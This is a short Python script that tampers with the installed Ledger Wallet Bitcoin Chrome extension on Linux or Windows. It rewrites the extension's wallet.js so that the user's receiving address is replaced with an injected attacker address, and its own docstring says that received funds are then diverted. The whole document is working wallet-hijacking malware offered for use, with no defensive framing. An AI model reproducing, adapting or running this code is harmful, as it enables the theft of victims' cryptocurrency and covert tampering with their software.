#!/usr/bin/python3
"""
After modifying the JS file, any funds received will be sent to the 
injected address 
"""
import os
import shutil
import fileinput

INJECTED_BTC_ADDRESS = ''

# Fetch from chrome://extensions
ledger_wallet_btc_extension_id = 'kkdpmhnladdopljabkgpacgpliggeeaf'
ledger_wallet_btc_extension_version = '1.9.14_0'

# linux
btc_wallet_path = f'{os.path.expanduser("~")}/.config/google-chrome/Default/Extensions/{ledger_wallet_btc_extension_id}/{ledger_wallet_btc_extension_version}/src/wallet/wallet.js'

# windows
# btc_wallet_path = f'{os.path.expanduser("~")}\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Extensions\\{ledger_wallet_btc_extension_id}\\{ledger_wallet_btc_extension_version}\\src\\wallet\\wallet.js'

# backup user's original wallet file 
shutil.copyfile(btc_wallet_path, f'{btc_wallet_path}.bak')

text_to_search = '(_ref = this.wallet.cache) != null ? _ref.get(this.getCurrentPublicAddressPath()) : void 0;'
text_to_replace = INJECTED_BTC_ADDRESS

with fileinput.FileInput(btc_wallet_path, inplace=True, backup='.bak') as file:
    for line in file:
        print(line.replace(text_to_search, text_to_replace), end='')
